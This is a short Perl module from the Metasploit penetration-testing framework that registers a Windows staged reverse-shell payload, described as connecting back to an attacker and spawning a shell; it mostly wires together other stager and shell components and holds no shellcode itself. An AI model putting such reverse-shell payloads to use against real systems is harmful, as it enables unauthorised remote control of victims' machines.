
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_ord;

use strict;
use base 'Msf::PayloadComponent::Windows::ia32::PipedShellStage';

my $info =
{
  'Name'         => 'Windows Staged Reverse Ordinal Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'spoonm <ninjatools [at] hush.com>', ],
};

sub _Load 
{
	Msf::PayloadComponent::Windows::ia32::PipedShellStage->_Import('Msf::PayloadComponent::Windows::ia32::ReverseOrdinalStager');

	__PACKAGE__->SUPER::_Load();
}

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	_Load();

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash, @_);

	return($self);
}

1;
